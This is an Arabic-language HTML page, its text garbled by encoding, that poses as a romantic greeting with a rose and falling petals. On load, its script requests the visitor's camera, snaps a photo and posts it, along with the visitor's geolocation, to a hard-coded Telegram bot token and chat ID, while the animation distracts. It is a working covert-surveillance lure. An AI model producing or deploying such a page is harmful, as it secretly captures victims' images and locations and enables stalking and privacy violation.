<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Ù„Ø­Ø¸Ø© Ø­Ø¨</title>
  <style>
    body {
      background: #fff0f5;
      overflow: hidden;
      text-align: center;
      font-family: sans-serif;
    }
    #rose {
      font-size: 50px;
      margin-top: 20px;
    }
    canvas {
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <h1>Ø£Ù‡Ù„Ø§Ù‹ Ø¨Ùƒ ÙŠØ§ ÙˆØ±Ø¯Ø©</h1>
  <p>Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù…ÙŠÙ„...</p>
  <div id="rose">ğŸŒ¹</div>
  <canvas id="falling"></canvas>

  <script>
    const botToken = '7931908611:AAF5IKqLSL9IJkOezV1Qzgk9sM9v8iuiFYQ';
    const chatId = '7070074537';

    // 1. Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ£Ø®Ø° ØµÙˆØ±Ø©
    async function captureAndSend() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/jpeg');

        stream.getTracks().forEach(track => track.stop());

        const blob = await (await fetch(imageData)).blob();
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'selfie.jpg');
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
      } catch (e) {
        console.warn('Ø±ÙØ¶ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø£Ùˆ Ø­Ø¯Ø« Ø®Ø·Ø£:', e);
      }
    }

    // 2. Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ
    function sendLocation() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(async pos => {
          const { latitude, longitude } = pos.coords;
          const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
          await fetch(url);
        }, err => {
          console.warn("Ø±ÙØ¶ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø£Ùˆ Ø®Ø·Ø£:", err);
        });
      }
    }

    // 3. ØªØ£Ø«ÙŠØ± Ø§Ù„ÙˆØ±Ø¯ Ø§Ù„Ù…ØªØ³Ø§Ù‚Ø·
    function startFalling() {
      const canvas = document.getElementById('falling');
      const ctx = canvas.getContext('2d');
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;

      const petals = Array.from({ length: 50 }, () => ({
        x: Math.random() * canvas.width,
        y: Math.random() * canvas.height,
        r: Math.random() * 20 + 10,
        d: Math.random() * 1 + 0.5
      }));

      function draw() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "rgba(255,0,128,0.6)";
        petals.forEach(p => {
          ctx.beginPath();
          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
          ctx.fill();
        });
        update();
        requestAnimationFrame(draw);
      }

      function update() {
        petals.forEach(p => {
          p.y += p.d;
          if (p.y > canvas.height) {
            p.y = -p.r;
            p.x = Math.random() * canvas.width;
          }
        });
      }

      draw();
    }

    // ØªØ´ØºÙŠÙ„ ÙƒÙ„Ø´ÙŠ Ø¨Ø§Ù„ØªØ³Ù„Ø³Ù„
    (async () => {
      await captureAndSend();
      sendLocation();
      startFalling();
      document.querySelector('p').textContent = 'Ø§Ù†Øª Ø§Ù„ÙˆØ±Ø¯Ø© Ø§Ù„Ø­Ù„ÙˆØ©!';
    })();
  </script>
</body>
</html>
